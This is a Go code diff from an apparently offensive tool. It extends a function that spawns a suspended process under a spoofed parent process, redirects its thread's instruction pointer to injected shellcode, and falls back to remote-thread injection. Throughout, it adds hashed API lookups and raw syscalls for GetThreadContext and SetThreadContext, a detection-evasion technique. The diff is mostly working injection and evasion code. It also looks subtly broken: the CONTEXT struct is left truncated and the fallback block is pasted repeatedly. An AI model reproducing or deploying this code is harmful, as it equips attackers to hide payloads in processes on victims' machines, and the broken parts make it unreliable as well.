@@ -3,9 +3,11 @@
 package core
 
 import (
+	"fmt"
 	"golang.org/x/sys/windows"
 	"syscall"
 	"unsafe"
+	"toxoglosser/common"
 )
 
 const (
@@ -87,8 +89,13 @@ func CreateProcessWithSpoofedParent(targetProcessPath string, spoofedParentPID u
 	si.Cb = uint32(unsafe.Sizeof(si))
 	si.Flags = windows.STARTF_USESHOWWINDOW
 	si.ShowWindow = 0
-	si.ExStyle = windows.STARTF_USESTDHANDLES
-	si.AttributeList = attrList
+
+	// Create extended startup info structure
+	var (
+		siEx windows.StartupInfoEx
+	)
+	siEx.StartupInfo = si
+	siEx.ProcThreadAttributeList = (*windows.ProcThreadAttributeList)(unsafe.Pointer(attrList))
 
 	// Create the target process in suspended state
 	err = windows.CreateProcess(
@@ -100,7 +107,7 @@ func CreateProcessWithSpoofedParent(targetProcessPath string, spoofedParentPID u
 		windows.CREATE_SUSPENDED|windows.EXTENDED_STARTUPINFO_PRESENT, // CreationFlags
 		nil, // Environment
 		nil, // CurrentDirectory
-		&si, // StartupInfo
+		(*windows.StartupInfo)(&siEx.StartupInfo), // StartupInfo
 		&pi, // ProcessInformation
 	)
 
@@ -119,13 +126,110 @@ func CreateProcessWithSpoofedParent(targetProcessPath string, spoofedParentPID u
 			return err
 		}
 
-		// Get the thread context to modify the instruction pointer
-		var ctx windows.Context
-		ctx.Flags = windows.CONTEXT_CONTROL
+		// Define CONTEXT structure manually (x64 context)
+		type Context struct {
+			P1Home   uint64
+			P2Home   uint64
+			P3Home   uint64
+			P4Home   uint64
+			P5Home   uint64
+			P6Home   uint64
+			ContextFlags uint32
+			MxCsr    uint32
+			SegCs    uint16
+			SegDs    uint16
+			SegEs    uint16
+			SegFs    uint16
+			SegGs    uint16
+			SegSs    uint16
+			EFlags   uint32
+			Dr0      uint64
+			Dr1      uint64
+			Dr2      uint64
+			Dr3      uint64
+			Dr6      uint64
+			Dr7      uint64
+			Rax      uint64
+			Rcx      uint64
+			Rdx      uint64
+			Rbx      uint64
+			Rsp      uint64
+			Rbp      uint64
+			Rsi      uint64
+			Rdi      uint64
+			R8       uint64
+			R9       uint64
+			R10      uint64
+			R11      uint64
+			R12      uint64
+			R13      uint64
+			R14      uint64
+			R15      uint64
+			Rip      uint64
+			// ... rest of structure
+		}
 
-		// Get the current thread context
-		err = windows.GetThreadContext(pi.Thread, &ctx)
+		var ctx Context
+		ctx.ContextFlags = 0x100001 // CONTEXT_CONTROL | CONTEXT_INTEGER
+
+		// Resolve GetThreadContext manually using the common package
+		kernel32Handle, err := common.GetModuleHandleByHash("kernel32.dll")
 		if err != nil {
+			fmt.Printf("[-] Failed to get kernel32 handle: %v. Using CreateRemoteThread fallback.\n", err)
+			var threadHandle windows.Handle
+			err = NtCreateThreadEx(
+				&threadHandle,
+				0x1FFFFF, // THREAD_ALL_ACCESS
+				0,        // ObjectAttributes
+				pi.Process,
+				shellcodeAddr, // Start routine
+				0,             // Parameter
+				0,             // CreateSuspended (0 = start immediately)
+				0,             // ZeroBits
+				0,             // StackSize
+				0,             // MaxStackSize
+				0,             // AttributeList
+			)
+			if err != nil {
+				return err
+			}
+			windows.CloseHandle(threadHandle)
+			return nil
+		}
+
+		getThreadContextAddr, err := common.GetProcAddressByHash(windows.Handle(kernel32Handle), "GetThreadContext")
+		if err != nil {
+			fmt.Printf("[-] Failed to resolve GetThreadContext: %v. Using CreateRemoteThread fallback.\n", err)
+			var threadHandle windows.Handle
+			err = NtCreateThreadEx(
+				&threadHandle,
+				0x1FFFFF, // THREAD_ALL_ACCESS
+				0,        // ObjectAttributes
+				pi.Process,
+				shellcodeAddr, // Start routine
+				0,             // Parameter
+				0,             // CreateSuspended (0 = start immediately)
+				0,             // ZeroBits
+				0,             // StackSize
+				0,             // MaxStackSize
+				0,             // AttributeList
+			)
+			if err != nil {
+				return err
+			}
+			windows.CloseHandle(threadHandle)
+			return nil
+		}
+
+		// Call GetThreadContext using syscall
+		ret, _, _ := syscall.Syscall(
+			getThreadContextAddr,
+			2,
+			uintptr(pi.Thread),
+			uintptr(unsafe.Pointer(&ctx)),
+			0,
+		)
+		if ret == 0 { // FALSE means failure
 			// If GetThreadContext fails, fall back to creating a new thread in the process
 			var threadHandle windows.Handle
 			err = NtCreateThreadEx(
@@ -149,12 +253,24 @@ func CreateProcessWithSpoofedParent(targetProcessPath string, spoofedParentPID u
 		}
 
 		// Modify the instruction pointer to our payload
-		ctx.Rip = shellcodeAddr
+		ctx.Rip = uint64(shellcodeAddr)
 
-		// Set the modified context
-		err = windows.SetThreadContext(pi.Thread, &ctx)
+		// Resolve SetThreadContext manually using the common package
+		setThreadContextAddr, err := common.GetProcAddressByHash(windows.Handle(kernel32Handle), "SetThreadContext")
 		if err != nil {
-			return err
+			return fmt.Errorf("failed to resolve SetThreadContext: %v", err)
+		}
+
+		// Call SetThreadContext using syscall
+		ret, _, _ = syscall.Syscall(
+			setThreadContextAddr,
+			2,
+			uintptr(pi.Thread),
+			uintptr(unsafe.Pointer(&ctx)),
+			0,
+		)
+		if ret == 0 { // FALSE means failure
+			return fmt.Errorf("SetThreadContext failed")
 		}
 
 		// Resume the thread to execute our payload
@@ -184,11 +300,11 @@ type ProcThreadAttributeList struct {
 
 // System calls for extended process creation
 var (
-	ntdll                    = syscall.NewLazyDLL("ntdll.dll")
-	kernel32                 = syscall.NewLazyDLL("kernel32.dll")
-	procInitializeProcThreadAttributeList = kernel32.NewProc("InitializeProcThreadAttributeList")
-	procUpdateProcThreadAttribute         = kernel32.NewProc("UpdateProcThreadAttribute")
-	procDeleteProcThreadAttributeList     = kernel32.NewProc("DeleteProcThreadAttributeList")
+	psNtdll                    = syscall.NewLazyDLL("ntdll.dll")
+	psKernel32                 = syscall.NewLazyDLL("kernel32.dll")
+	procInitializeProcThreadAttributeList = psKernel32.NewProc("InitializeProcThreadAttributeList")
+	procUpdateProcThreadAttribute         = psKernel32.NewProc("UpdateProcThreadAttribute")
+	procDeleteProcThreadAttributeList     = psKernel32.NewProc("DeleteProcThreadAttributeList")
 )
 
 func initializeProcThreadAttributeList(list *ProcThreadAttributeList, count uint32, flags uint32, size *uintptr) (bool, error) {
